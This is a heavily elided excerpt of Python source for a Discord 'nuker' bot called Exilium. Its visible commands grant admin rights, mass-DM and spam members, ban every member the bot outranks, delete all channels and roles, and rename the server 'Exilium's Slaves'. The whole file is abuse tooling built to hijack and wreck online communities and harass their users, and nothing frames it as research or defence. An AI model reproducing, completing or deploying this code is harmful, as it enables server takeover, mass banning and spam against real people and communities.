...
async def on_ready():
    os.system("cls")
    print(colored(f"Exilium initialized as: {client.user}",'blue'))
    print("")
...
async def help(ctx):
    ...
    if validation:
        print(colored("Exilium - Help Menu Receive",'magenta'))
        if ctx.guild:
    ...
    if validation:
        ...
        if mode == "all":
            if nickname != "":
                ...
                print(colored(f"{time}",'white'), colored("Exilium - Nickname Changed",'magenta'))
...
async def grantadmin(ctx, mode=""):
    ...
    if validation:
        ...
        if mode == "all":
            ...
            print(colored(f"{time}", 'white'), colored("Exilium - Admin Granted", 'magenta'))
        else:
            time = datetime.now().strftime("%H:%M:%S")
            member_id = int(mode.strip("<@!>"))
            member = discord.utils.get(guild.members, id=member_id)
    ...
    if validation:
        ...
        if ctx.guild is not None:
            try:
                ...
                print(colored(f"{time}",'white'), colored(f"{time}",'white'), colored("Exilium - Mass DM Complete",'magenta'))
            except Exception as e:
                time = datetime.now().strftime("%H:%M:%S")
            ...
            try:
                ...
                print(colored(f"{time}",'white'), colored("Exilium - Mass DM Complete",'magenta'))
            except Exception as e:
                time = datetime.now().strftime("%H:%M:%S")
        ...
        if message != '':
            if str(user.id) not in userid and user.id != client.user.id and user.bot != True:
                try:
                    ...
                    print(colored(f"{time}",'white'), colored("Exilium - User DM Complete",'magenta'))
                except:
                    time = datetime.now().strftime("%H:%M:%S")
                ...
                if str(user.id) not in userid and user.id != client.user.id and user.bot != True:
                    if amount < 50:
                        try:
                            ...
                            print(colored(f"{time}",'white'), colored("Exilium - User Spam Complete",'magenta'))
                        except:
                            time = datetime.now().strftime("%H:%M:%S")
        ...
        if mode in nuke_modes:
            if mode == "members":
                    ...
                    for member in guild.members:
                        if str(member.id) not in userid and member.id != client.user.id:
                            if discord.utils.get(guild.roles, id=bot_member.top_role.id) > discord.utils.get(guild.roles, id=member.top_role.id):
                                try:
                                    await member.ban(reason="Exilium - Banned")
                                    time = datetime.now().strftime("%H:%M:%S")
                                ...
                                time = datetime.now().strftime("%H:%M:%S")
                                print(colored(f"{time}",'white'), colored(f"Couldn't ban {member} because of role hierarchy.",'red'))
                    print(colored(f"{time}",'white'), colored("Exilium - Member Ban Complete",'magenta'))
                else:
                ...
                if bot_member.guild_permissions.administrator:
                    ...
                    print(colored(f"{time}",'white'), colored("Exilium - Channel Deleted",'magenta'))
                else:
                    time = datetime.now().strftime("%H:%M:%S")
                ...
                if bot_member.guild_permissions.administrator:
                    ...
                    print(colored(f"{time}",'white'), colored("Exilium - Role Deleted",'magenta'))
                else:
                    time = datetime.now().strftime("%H:%M:%S")
                ...
                if bot_member.guild_permissions.administrator:
                    ...
                    await guild.edit(name="Exilium's Slaves")
                    time = datetime.now().strftime("%H:%M:%S")
                    print(colored(f"{time}",'white'), colored(f"Changed server name to Exilium's Slaves",'green'))
                    print(colored(f"{time}",'white'), colored("Exilium - Nuked",'magenta'))
                else:
                    time = datetime.now().strftime("%H:%M:%S")
